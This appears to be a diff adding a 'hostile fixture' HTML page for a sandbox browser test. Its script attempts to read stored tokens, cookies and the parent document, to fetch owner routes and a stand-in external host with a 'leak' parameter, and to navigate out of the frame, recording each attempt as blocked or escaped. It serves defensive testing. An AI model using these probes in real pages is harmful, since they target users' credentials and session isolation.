@@ -1,0 +1,44 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>hostile fixture</title></head>
+<body>
+<pre id="out">running</pre>
+<script>
+// Hostile fixture for the project-apps sandbox browser test (docs/specs/project-apps-sandbox.md §8).
+// Every attempt below must FAIL inside the sealed frame; only its own data write may succeed.
+// Results are reported to the parent as {type:'hostile-report', results} (the wrapper ignores
+// unknown types; the test reads document title + #out instead).
+(async function () {
+  const r = {};
+  const tryIt = async (name, fn) => { try { const v = await fn(); r[name] = 'ESCAPED:' + String(v).slice(0, 60); } catch (e) { r[name] = 'blocked'; } };
+  await tryIt('localStorage', () => { const v = localStorage.getItem('instar_token'); if (v === null) throw new Error('none'); return v; });
+  await tryIt('indexedDB', () => new Promise((ok, no) => { try { const q = indexedDB.open('instar-browser-device'); q.onsuccess = () => ok('opened'); q.onerror = () => no(new Error('x')); } catch (e) { no(e); } }));
+  await tryIt('cookie', () => { if (!document.cookie) throw new Error('empty'); return document.cookie; });
+  await tryIt('parentDocument', () => parent.document.title);
+  await tryIt('fetchOwnerRoute', async () => { const x = await fetch('/work-board', { credentials: 'include' }); if (!x.ok) throw new Error(String(x.status)); return x.status; });
+  await tryIt('fetchExternal', async () => { await fetch('https://example.com/?leak=1', { mode: 'no-cors' }); return 'sent'; });
+  await tryIt('windowOpen', () => { const w = window.open('https://example.com/'); if (!w) throw new Error('null'); return 'opened'; });
+  await tryIt('topNavigation', () => { top.location.href = 'https://example.com/'; return 'navigated'; });
+  let key = null;
+  window.addEventListener('message', async (e) => {
+    if (!e.data || e.data.type !== 'instar-project-app-key') return;
+    key = e.data.key;
+    const appId = (location.pathname.match(/project-apps\/(pa_[0-9a-f]{16})\//) || [])[1];
+    try {
+      const w = await fetch(`/project-apps/${appId}/api/data`, { method: 'PUT', headers: { 'X-Project-App-Key': key, 'Content-Type': 'application/json' }, body: JSON.stringify({ body: { hello: 'own data' }, base: null }) });
+      r.ownDataWrite = w.ok ? 'ok' : 'failed:' + w.status;
+    } catch (err) { r.ownDataWrite = 'failed:' + String(err); }
+    try {
+      const a = await fetch('/work/projects', { headers: { 'X-Project-App-Key': key, Authorization: 'Bearer ' + key } });
+      r.keyOnOwnerRoute = a.status === 401 || a.status === 403 ? 'blocked' : 'ESCAPED:' + a.status;
+    } catch (err) { r.keyOnOwnerRoute = 'blocked'; }
+    document.getElementById('out').textContent = JSON.stringify(r);
+    document.title = 'done';
+    parent.postMessage({ type: 'hostile-report', results: r }, '*');
+  });
+  document.getElementById('out').textContent = JSON.stringify(r);
+  parent.postMessage({ type: 'ready' }, '*');
+  // Self-navigation last: if the wrapper's frame-src works, this navigation is blocked and the page stays.
+  setTimeout(() => { try { location.href = 'https://example.com/?selfnav=1'; } catch (e) { /* blocked */ } }, 4000);
+})();
+</script>
+</body></html>
